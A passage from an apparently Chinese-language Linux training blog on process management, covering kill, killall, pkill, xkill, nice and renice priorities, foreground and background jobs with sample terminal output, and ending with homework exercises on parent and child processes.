<td align="left">指定 kill 命令只打印相关进程的进程号,而不发送任何信号</td>
</tr>
<tr>
<td align="left">-s</td>
<td align="left">指定发送信号</td>
</tr>
<tr>
<td align="left">-u</td>
<td align="left">指定用户</td>
</tr>
</tbody></table>
<h3 id="killall"><a href="#killall" class="headerlink" title="killall"></a>killall</h3><p>用于关掉多个同名的进程</p>
<p>killall -9 ping        ===&gt;关掉所有的ping进程</p>
<h3 id="pkill"><a href="#pkill" class="headerlink" title="pkill"></a>pkill</h3><p>使用pkill命令可以根据进程的名称／运行该进程的用户／进程所在的终端等等属性来终止特定的进程<br>pkill -9 -t 终端名     ===&gt;关掉由该终端开启的进程<br>pkill -9 -U 用户名  ===&gt;关掉由该用户开启的进程</p>
<h3 id="xkill"><a href="#xkill" class="headerlink" title="xkill"></a>xkill</h3><p>哪里关不掉点哪里</p>
<p>主要用于停止图形化（GUI）程序</p>
<h3 id="进程优先级"><a href="#进程优先级" class="headerlink" title="进程优先级"></a>进程优先级</h3><p>NI nice</p>
<p>数字表示 : -20-19 数字越小 , 等级越高</p>
<p><code>ps -le | grep ping</code> &lt;== 查看 ping 的优先级</p>
<h3 id="指定优先级"><a href="#指定优先级" class="headerlink" title="指定优先级"></a>指定优先级</h3><p><code>nice -n 3 ping 172.0.0.1</code></p>
<p>普通用户不能指定比 0 小的优先级 ， root 用户随意</p>
<p>普通用户只能做贡献，上帝随意设置优先级</p>
<h3 id="调整优先级"><a href="#调整优先级" class="headerlink" title="调整优先级"></a>调整优先级</h3><p><code>renice -n [-20-19] [pid] &lt;== 调整优先级</code></p>
<p>root 可以升高也可降低nice值，代表可以设置优先级更低可以设置优先级更高。</p>
<p>普通用户只能升高nice值，代表只能降低优先级。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]#nice -n 3 ping 172.25.0.10</span><br><span class="line">[root@rhel6 ~]#nice -n 5 ping 172.25.0.10</span><br><span class="line">[root@rhel6 ~]#ps -le|grep ping</span><br><span class="line">4 S     0 26613 26536  0  83   3 - 25812 skb_re pts/1    00:00:00 ping</span><br><span class="line">4 S     0 26614 26567  0  85   5 - 25812 skb_re pts/2    00:00:00 ping</span><br><span class="line">[root@rhel6 ~]#renice -n -1 26613</span><br><span class="line">26613: old priority 3, new priority -1</span><br><span class="line">[root@rhel6 ~]#ps -le|grep ping</span><br><span class="line">4 S     0 26613 26536  0  79  -1 - 25812 skb_re pts/1    00:00:00 ping</span><br><span class="line">4 S     0 26614 26567  0  85   5 - 25812 skb_re pts/2    00:00:00 ping</span><br></pre></td></tr></table></figure>

<h2 id="前后台作业"><a href="#前后台作业" class="headerlink" title="前后台作业"></a>前后台作业</h2><ul>
<li>&amp; 在创建进程的过程中 , 将前台作业放置到后台的方法 ，在命令后面加上 &amp;</li>
<li>jobs 查看后台进程</li>
<li>fg 将后台作业调用到前台</li>
<li>ctrl+z 将已经触发的前台作业调到后台 , 后台作业暂停</li>
<li>bg 让后台作业执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]#ping 172.25.0.11 &gt;/dev/null &amp;</span><br><span class="line">[1] 26712</span><br><span class="line">[root@rhel6 ~]#ping 172.25.0.10 &gt;/dev/null &amp;</span><br><span class="line">[2] 26713</span><br><span class="line"><span class="meta">[#</span><span class="bash">13<span class="comment">#root@rhel6 ~]#jobs</span></span></span><br><span class="line">[1]- Running</span><br><span class="line">ping 172.25.0.11 &gt; /dev/null &amp;</span><br><span class="line">[2]+ Running</span><br><span class="line">ping 172.25.0.10 &gt; /dev/null &amp;</span><br><span class="line">[root@rhel6 ~]#fg 2</span><br><span class="line">ping 172.25.0.10 &gt; /dev/null</span><br><span class="line">^Z</span><br><span class="line">[2]+ Stopped</span><br><span class="line">ping 172.25.0.10 &gt; /dev/null</span><br><span class="line">[root@rhel6 ~]#bg 2</span><br><span class="line">[2]+ ping 172.25.0.10 &gt; /dev/null &amp;</span><br><span class="line">[root@rhel6 ~]#ps -ef|grep ping</span><br><span class="line">root 26712 26567 0 18:16 pts/2 00:00:00 ping 172.25.0.11</span><br><span class="line">root 26713 26567 0 18:16 pts/2 00:00:00 ping 172.25.0.10</span><br><span class="line">root 26717 26567 0 18:17 pts/2 00:00:00 grep ping</span><br><span class="line">[root@rhel6 ~]#kill 26712</span><br><span class="line">[root@rhel6 ~]#jobs</span><br><span class="line">[1]- Terminated</span><br><span class="line">ping 172.25.0.11 &gt; /dev/null</span><br><span class="line">[2]+ Running</span><br><span class="line">ping 172.25.0.10 &gt; /dev/null &amp;</span><br><span class="line">[root@rhel6 ~]#kill 26713</span><br><span class="line">[root@rhel6 ~]#jobs</span><br><span class="line">[2]+ Terminated</span><br><span class="line">ping 172.25.0.10 &gt; /dev/null</span><br><span class="line"><span class="meta">[#</span><span class="bash">21<span class="comment">#root@rhel6 ~]#jobs</span></span></span><br></pre></td></tr></table></figure>

<h2 id="进程管理课后作业"><a href="#进程管理课后作业" class="headerlink" title="进程管理课后作业"></a>进程管理课后作业</h2><p>进程管理</p>
<ol>
<li><p>关于父进程和子进程的实验:<br>打开一个终端登陆 ssh root@rhel7-fN 进入输入密码的状态,先不输入密码,查看进程;输入</p>
<p>密码后再查看进程。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rhel7</span><br><span class="line">[root@rhel7 ~]# ps -ef|grep bash</span><br><span class="line">root       642     1  0 02:46 ?        00:00:00 /bin/bash /usr/sbin/ksmtuned</span><br><span class="line">root      7844  7839  1 06:29 pts/0    00:00:00 -bash</span><br><span class="line">[root@rhel7 ~]# ps -ef|grep ssh</span><br><span class="line">root      1261     1  0 02:46 ?        00:00:00 /usr/sbin/sshd -D</span><br><span class="line">root      7839  1261  0 06:29 ?        00:00:00 sshd: root@pts/0</span><br><span class="line">root      7892  1261  0 06:29 ?        00:00:00 sshd: root [priv]</span><br><span class="line">sshd      7893  7892  0 06:29 ?        00:00:00 sshd: root [net]</span><br><span class="line">root      7906  7844  0 06:30 pts/0    00:00:00 grep --color=auto ssh</span><br><span class="line">[root@rhel7 ~]# ps -ef|grep bash</span><br><span class="line">root       642     1  0 02:46 ?        00:00:00 /bin/bash /usr/sbin/ksmtuned</span><br><span class="line">root      7844  7839  0 06:29 pts/0    00:00:00 -bash</span><br><span class="line">root      7915  7892  0 06:30 pts/1    00:00:00 -bash</span><br><span class="line">root      7957  7844  0 06:30 pts/0    00:00:00 grep --color=auto bash</span><br><span class="line">[root@rhel7 ~]# ps -ef|grep 7892</span><br><span class="line">root      7892  1261  0 06:29 ?        00:00:00 sshd: root@pts/1</span><br><span class="line">root      7915  7892  0 06:30 pts/1    00:00:00 -bash</span><br><span class="line">[root@rhel7 ~]# ps -ef|grep 1261</span><br><span class="line">root      1261     1  0 02:46 ?        00:00:00 /usr/sbin/sshd -D</span><br><span class="line">root      7839  1261  0 06:29 ?        00:00:00 sshd: root@pts/0</span><br><span class="line">root      7892  1261  0 06:29 ?        00:00:00 sshd: root@pts/1</span><br><span class="line">[root@rhel7 ~]# ps -ef|grep 1|head -n 1</span><br><span class="line">root         1     0  0 02:46 ?        00:00:03 /usr/lib/systemd/systemd --switched-root --system --deserialize 20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rhel6</span><br><span class="line">[root@rhel6 ~]#ps -ef|grep ssh</span><br><span class="line">root      1421     1  0 15:56 ?        00:00:00 /usr/sbin/sshd</span><br><span class="line">root     26564  1421  0 17:36 ?        00:00:00 sshd: root@pts/2</span><br><span class="line">root     26750  1421  0 18:25 ?        00:00:00 sshd: root@pts/3</span><br><span class="line">root     26829 26803  0 18:29 pts/3    00:00:00 ssh root@172.25.0.10</span><br><span class="line">root     26848 26567  0 18:37 pts/2    00:00:00 grep ssh</span><br><span class="line">[root@rhel6 ~]#ps -ef|grep ssh</span><br><span class="line">root      1421     1  0 15:56 ?        00:00:00 /usr/sbin/sshd</span><br><span class="line">root     26564  1421  0 17:36 ?        00:00:00 sshd: root@pts/2</span><br><span class="line">root     26750  1421  0 18:25 ?        00:00:00 sshd: root@pts/3</span><br><span class="line">root     26829 26803  0 18:29 pts/3    00:00:00 ssh root@172.25.0.10</span><br><span class="line">root     26849  1421  0 18:37 ?        00:00:00 sshd: [accepted]</span><br><span class="line">sshd     26850 26849  0 18:37 ?        00:00:00 sshd: [net]      </span><br><span class="line">root     26852 26567  0 18:37 pts/2    00:00:00 grep ssh</span><br><span class="line">[root@rhel6 ~]#ps -ef|grep ssh</span><br><span class="line">root      1421     1  0 15:56 ?        00:00:00 /usr/sbin/sshd</span><br><span class="line">root     26564  1421  0 17:36 ?        00:00:00 sshd: root@pts/2</span><br><span class="line">root     26750  1421  0 18:25 ?        00:00:00 sshd: root@pts/3</span><br><span class="line">root     26829 26803  0 18:29 pts/3    00:00:00 ssh root@172.25.0.10</span><br><span class="line">root     26849  1421  1 18:37 ?        00:00:00 sshd: root@pts/0</span><br><span class="line">root     26874 26567  0 18:38 pts/2    00:00:00 grep ssh</span><br><span class="line">[root@rhel6 ~]#ps -ef|grep 1421</span><br><span class="line">root      1421     1  0 15:56 ?        00:00:00 /usr/sbin/sshd</span><br><span class="line">root     26564  1421  0 17:36 ?        00:00:00 sshd: root@pts/2</span><br><span class="line">root     26750  1421  0 18:25 ?        00:00:00 sshd: root@pts/3</span><br><span class="line">root     26849  1421  0 18:37 ?        00:00:00 sshd: root@pts/0</span><br><span class="line">root     26877 26567  0 18:38 pts/2    00:00:00 grep 1421</span><br><span class="line">[root@rhel6 ~]#ps -ef|grep 1|head -n 1</span><br><span class="line">root         1     0  0 15:55 ?        00:00:01 /sbin/init</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建多个vi 进程，并使其运行在系统后台，设置vi 后台进程的优先级（nice）值，分别为1、5、15、17，并随后将其统一修改为18。</p>
</li>
<li><p>观察top命令的显示信息，找出当前占用cpu、内存、I/O资源最多的进程号和进程名。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
